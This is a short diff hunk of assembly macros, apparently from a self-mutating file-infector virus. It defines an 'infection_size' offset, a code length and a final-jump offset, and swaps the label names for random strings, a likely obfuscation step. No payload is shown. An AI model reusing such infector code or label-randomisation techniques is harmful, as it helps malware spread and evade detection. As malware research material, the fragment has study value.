@@ -36,8 +36,8 @@
 %define  INF(x)    [(rbp - infection_size) + x]
 
 
-%define  CODE_LEN  (VaOYO - _start)
-%define  FINJMP_OFF  (IJ6oCVD - _start)
+%define  CODE_LEN  (pbnliJXjh - _start)
+%define  FINJMP_OFF  (EGhECZkfl - _start)
 %define  PAGE_SIZE  0x1000
 
 
